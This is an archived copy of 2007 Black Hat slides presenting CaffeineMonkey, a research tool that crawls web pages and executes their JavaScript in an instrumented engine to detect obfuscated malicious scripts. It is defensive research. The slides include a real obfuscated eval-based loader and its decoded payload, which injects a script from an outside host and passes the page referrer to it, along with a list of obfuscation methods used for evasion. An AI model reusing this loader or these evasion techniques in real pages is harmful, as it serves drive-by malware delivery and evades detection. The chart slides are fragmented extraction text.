---
type: Whitepaper
title: "CaffeineMonkey: Automated Collection, Detection and Analysis of Malicious JavaScript"
description: Detecting malicious JavaScript by executing it rather than matching bytes. Heritrix crawls candidate pages into a central database and an instrumented SpiderMonkey runs each script, logging method calls so obfuscation - whitespace and comment randomisation, string splitting, integer rewriting, identifier renaming - does not hide behaviour.
resource: "https://blackhat.com/presentations/bh-usa-07/Feinstein_and_Peck/Presentation/bh-usa-07-feinstein_and_peck.pdf"
tags: [whitepaper, webseclist-reference, javascript, javascript-runtime, detection, dynamic-analysis, tooling, filter-bypass, measurement-study, owasp-a05-2021, owasp-a09-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-09T12:52:57+00:00"
status: stable
stale_after: 2027-08-09
sources:
  - id: original
    resource: "https://blackhat.com/presentations/bh-usa-07/Feinstein_and_Peck/Presentation/bh-usa-07-feinstein_and_peck.pdf"
    title: "CaffeineMonkey: Automated Collection, Detection and Analysis of Malicious JavaScript"
    author: Ben Feinstein, Daniel Peck
also_at: []
authors:
  - Ben Feinstein
  - Daniel Peck
canonical_url: ""
cited_by:
  - "2007.md:103"
commit: ""
content_sha256: b72023f4366525eef3862a8ced4116c2518d5682bf377b167379af672a0d5991
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://blackhat.com/presentations/bh-usa-07/Feinstein_and_Peck/Presentation/bh-usa-07-feinstein_and_peck.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 8a7f9a835dee6dcbdc4b65c0638bdc243c3076c39fd0691e9fd7cf60c052b2eb
retrieved_from: "https://blackhat.com/presentations/bh-usa-07/Feinstein_and_Peck/Presentation/bh-usa-07-feinstein_and_peck.pdf"
retrieved_kind: manual-import
retrieved_utc: "2026-08-09T12:52:57+00:00"
slug: caffeinemonkey-automated-collection-detection-analysis-malicious-javascript
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# CaffeineMonkey: Automated Collection, Detection and Analysis of Malicious JavaScript

**CaffeineMonkey: Automated Collection, Detection and Analysis of Malicious JavaScript** - Ben Feinstein, Daniel Peck, Publisher not stated.

- Published: date not stated
- Original: <https://blackhat.com/presentations/bh-usa-07/Feinstein_and_Peck/Presentation/bh-usa-07-feinstein_and_peck.pdf>
- Preserved from: https://blackhat.com/presentations/bh-usa-07/Feinstein_and_Peck/Presentation/bh-usa-07-feinstein_and_peck.pdf (manual-import) on 2026-08-09
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# CaffeineMonkey: Automated Collection, Detection and Analysis of Malicious JavaScript

Caffeine Monkey

         Automated Collection, Detection and Analysis of Malicious
         JavaScript

         Ben Feinstein, CISSP
         Daniel Peck
         SecureWorks, Inc.




Feinstein & Peck                Black Hat USA 2007                   1
Introductions
 Welcome to Black Hat USA 2007!

 Who are we?

 Who is SecureWorks?




Feinstein & Peck   Black Hat USA 2007   2
Malicious JavaScript
 Why should you care?

 Malware/Spyware
      Downloaders
      Browser Explotation
      Information Leakage


 Evasion / Bypass detection
Feinstein & Peck   Black Hat USA 2007   3
Who’d a thought animated cursors
could be so dangerous?
 Developed by Netscape in 1995

 JavaScript / JScript / ECMAScript

 JavaScript != DOM

 Blurs the lines between data/code

Feinstein & Peck   Black Hat USA 2007   4
Feature / functionality bloat
 Blame AJAX

 XMLHttpRequest

 More features = larger attack surface




Feinstein & Peck   Black Hat USA 2007     5
Web 2.0 – Ain’t it grand
 Tried using a browser with JavaScript
  turned off lately?

 A vice of your typical website
  designer / developer

 Many popular sites unusable w/o JS


Feinstein & Peck   Black Hat USA 2007     6
Is it really dangerous?
 Month of Browser Bugs
      MoBB #25: Native Function Iterator
      MoBB #8: RDS.DataControl URL


 gnucitizen.org JavaScript AttackAPI

 SPI’s browser-based port scanning

Feinstein & Peck   Black Hat USA 2007       7
Phishing/XSS
 XSS
      it is everywhere and the situation is not
       improving


 eBay seller ratings

 Address bar spoofing


Feinstein & Peck     Black Hat USA 2007            8
Postmortems
 Super Bowl XL / Dolphin Stadium Site
      IFRAME injection
      MS06-014
      MS07-004


 QuickTime MOV embedded JavaScript

 Shockwave / Flash embedded JavaScript

 Adobe PDF XSS
Feinstein & Peck      Black Hat USA 2007   9
Obfuscation / evasion techniques
 Whitespace randomization / randomized
  comments
      Changes the byte-stream “on-the-wire”
       significantly

 String encoding / unencoding
      How many different ways can you represent ‘A’?
      A, \x41, %41, \u0041, %u0041…

 String splitting and its more sophisticated
  siblings
      “lots ”+ “of ” + “detections ” + “fail”
Feinstein & Peck        Black Hat USA 2007          10
Obfuscation / evasion techniques
(cont)
 Integer obfuscation
      0x40000000 can be represented any number of
       ways
      31337 = 30000 + 1000 + 300 + 30 + 7


 Heap Spray / JS Feng Shui
      Alexander Sotirov’s talk tomorrow @ 15:15


 Variable and function name reassignment /
  randomization
Feinstein & Peck      Black Hat USA 2007           11
Obfuscation / evasion techniques
(cont)
 Block randomization
      for (i = 0; i < 100; i++) { /* for loop */ }

           while (i < 100) { i++; /* while loop */ }

           do { i++; /* do … while loop */ } while (i < 100)

 Alone these techniques are somewhat effective,
  combined, they make the script unrecognizable to
  humans and many programs

 Many products are at best taking guesses


Feinstein & Peck            Black Hat USA 2007                 12
Example of Highly Obfuscated JS
function
I(mK,G){if(!G){G='Ba,%7(r_)`m?dPSn=3J/@TUc0f:6uMhk;wy
HZEs-^O1N{W#XtKq4F&xV+jbRAi9g';}var R;var TB='';for(var
e=0;e<mK.length;e+=arguments.callee.toString().replace(/\s/
g,'').length-
535){R=(G.indexOf(mK.charAt(e))&255)<<18|(G.indexOf(mK.
charAt(e+1))&255)<<12|(G.indexOf(mK.charAt(e+2))&255)<
<(arguments.callee.toString().replace(/\s/g,'').length-
533)|G.indexOf(mK.charAt(e+3))&255;TB+=String.fromCharC
ode((R&16711680)>>16,(R&65280)>>8,R&255);}eval(TB.sub
string(0,TB.length-
(arguments.callee.toString().replace(/\s/g,'').length-
537)));}I('friHMU&E6-
=#MV`OMr@^`4K/=&``@(=;/7(S3&Ta3F@i)ZOwMs(40V`Ou_
=y)(PJ=4Fy:_3Fu%^X?VMVMqjOM_Ob6V=#0xdXuV3j6r@XnV
`EfHF-mx3X0VTWfUjF?-`EfsTqusTqmquynHtX`q{-
uxPq:caFnyuOSqB;),B;),B;),Bm),B;');



 Feinstein & Peck         Black Hat USA 2007                  13
Enter the Caffeine Monkey…
 Like many ideas, born at local bar

      Central DB for collection and analysis

      Collection of webpages and JavaScript

      Mechanisms to feed collection to various
       browsers and collect results
 Safe and lightweight alternative
Feinstein & Peck     Black Hat USA 2007         14
Caffeine Monkey (cont)
 Thankfully we have Open Source software
      Spidermonkey (Mozilla Javascript Engine)
      Heritrix Web Crawler, crawler.archive.org
      The folks at UMich for their Perl and php scripting


 Open Source
      DB and scripting released under GPLv3
      Spidermonkey extensions released under GPLv3


 Wrapping and logging methods in the interpreter


Feinstein & Peck         Black Hat USA 2007                  15
Heritrix web crawler




Feinstein & Peck   Black Hat USA 2007   16
Heritrix web crawler (2)




Feinstein & Peck   Black Hat USA 2007   17
Demo




Feinstein & Peck   Black Hat USA 2007   18
Demo (cont)




Feinstein & Peck   Black Hat USA 2007   19
Demo (cont)




Feinstein & Peck   Black Hat USA 2007   20
Result from Highly Obfuscated JS
eval("document.write('<SCRIPT
LANGUAGE="Javascript"
SRC="http://www.itzzot.cc/style/?ref
='+document.referrer+'"></'+'script
>');");




Feinstein & Peck   Black Hat USA 2007   21
Pitfalls in Current Techniques
 HoneyClients
      MS Strider HoneyMonkey Project
      Mitre Honeyclient
      Capture
      HoneyC


 Heavyweight / resource intensive

 High-interaction / slower detection
Feinstein & Peck   Black Hat USA 2007   22
Pitfalls in Current Techniques
(cont)
 Human Analysis
      Time consuming!
      Error prone
      Do you trust your <textarea> wrapper
       under 0day conditions?




Feinstein & Peck   Black Hat USA 2007         23
So what did we find?
 Initial Targets
          MySpace
          Warez / serials sites
          .edu pr0n sites
          .mil.[cc] pr0n sites
          StopBadware.org Sites

 Lots of obfuscated cookies/tracking/etc.

 Not perfect, but MySpace runs a cleaner
  ship than we expected

Feinstein & Peck         Black Hat USA 2007   24
Good Script, Bad Script
 Fingerprinting

 How methods are used

 Profiling the script execution

 “Benign” uses of obfuscation

Feinstein & Peck   Black Hat USA 2007   25
     Method Call Graphs
                              Function Call Analysis of "Bad" Scripts


45



40



35



30
                                                                                  object_ins tance

25                                                                                elem ent_ins tance
                                                                                  es cape
                                                                                  eval
20                                                                                s tring_ins tance/50
                                                                                  docum ent_write
15



10



 5



 0
         Chow #1        Chow #2                      Chow #3            Chow #4


     Feinstein & Peck                Black Hat USA 2007                              26
                Method Call Graphs
                                                               Function Call Analysis of Top JS Site s


400


350


300


250                                                                                                                                                       object_ins tance
                                                                                                                                                          elem ent_ins tance
                                                                                                                                                          es cape
200
                                                                                                                                                          eval
                                                                                                                                                          s tring_ins tance/50
150                                                                                                                                                       docum ent_write


100


 50


  0
                                           om




                                                                         .ru




                                                                                          m




                                                                                                                                  t
                                t




                                                                                                                                                      m
                                                                                                              om
            om




                                                          om




                                                                                                                              ne
                              ne




                                                                                         co




                                                                                                                                                  co
                                                                        ile
                                         .c




                                                                                                                             o.
                            k.




                                                                                                              .c
           .c




                                                         .c




                                                                                     e.




                                                                                                                                                 n.
                                     ite




                                                                        of
                           ic




                                                                                                                         ho
                                                                                                         og
       ce




                                                         ic




                                                                                    ub




                                                                                                                                             to
                           cl




                                                                    ot
                                    ev




                                                     us




                                                                                                                        ya
      pa




                                                                                                         al




                                                                                                                                            in
                       st




                                                                   ph




                                                                                ut




                                                                                                    at
                                                    hm




                                                                                                                                            cl
                                                                                                                    e.
                      fa
  ys




                                                                               yo




                                                                                                    tc




                                                                                                                                       ry
                                                                                                                   or
 m




                                                uc




                                                                                               gh




                                                                                                                                      lla
                                                                                                                   st
                                                m




                                                                                              fri




                                                                                                                                      hi
                 Feinstein & Peck                                       Black Hat USA 2007                                                                   27
               Method Call Graphs
                                                                                            Function Call Analysis (Combine d)


400



350


300



250                                                                                                                                                                                                           object_ins tance
                                                                                                                                                                                                              elem ent_ins tance
                                                                                                                                                                                                              es cape
200
                                                                                                                                                                                                              eval
                                                                                                                                                                                                              s tring_ins tance/50
150                                                                                                                                                                                                           docum ent_write


100


 50



    0
          x)




                         x)




                                        x)




                                                       x)




                                                                                                      om




                                                                                                                                .ru




                                                                                                                                                 m




                                                                                                                                                                                         t
                                                                                        t




                                                                                                                                                                                                          m
                                                                                                                                                                     om
                                                                      om




                                                                                                                     om




                                                                                                                                                                                     ne
                                                                                   ne
        (8




                       (8




                                      (8




                                                     (8




                                                                                                                                                co




                                                                                                                                                                                                       co
                                                                                                                               ile
                                                                                                    .c




                                                                                                                                                                                    o.
                                                                                   k.




                                                                                                                                                                     .c
                                                                     .c




                                                                                                                  .c




                                                                                                                                            e.
     #1




                    #2




                                   #3




                                                  #4




                                                                                                                                                                                                     n.
                                                                                                ite




                                                                                                                               of
                                                                                lic




                                                                                                                                                                                ho
                                                                                                                                                                og
                                                                 ce




                                                                                                                  ic




                                                                                                                                           ub




                                                                                                                                                                                                  to
                                                                                                                           ot
                                                                                               ev
                                                                               c




                                                                                                                us
    w




                   w




                                  w




                                                 w




                                                                                                                                                                               ya
                                                                pa




                                                                                                                                                                al




                                                                                                                                                                                                in
                                                                            st




                                                                                                                          ph




                                                                                                                                       ut
ho




               ho




                              ho




                                             ho




                                                                                                                                                           at
                                                                                                             hm




                                                                                                                                                                                                cl
                                                                           fa




                                                                                                                                                                           e.
                                                            ys




                                                                                                                                      yo




                                                                                                                                                           tc
C




               C




                              C




                                             C




                                                                                                                                                                                             ry
                                                                                                                                                                          or
                                                            m




                                                                                                           uc




                                                                                                                                                      gh




                                                                                                                                                                                          lla
                                                                                                                                                                          st
                                                                                                         m




                                                                                                                                                     fri




                                                                                                                                                                                         hi
               Feinstein & Peck                                                                  Black Hat USA 2007                                                                                              28
Future of Caffeine Monkey?
 Will be released this week
      http://www.secureworks.com/research/tools/
      Expand on it and save everyone some time


 Inclusion in proxy?
      IDS/IPS?
      Heuristics based addition to signature based
       platforms?


 Firefox plugin?

Feinstein & Peck       Black Hat USA 2007             29
Question & Answer




Feinstein & Peck   Black Hat USA 2007   30
Caffeine Monkey

         Automated Collection, Detection and Analysis of Malicious
         JavaScript

         Ben Feinstein, CISSP
         Daniel Peck
         SecureWorks, Inc.




Feinstein & Peck                Black Hat USA 2007                   31
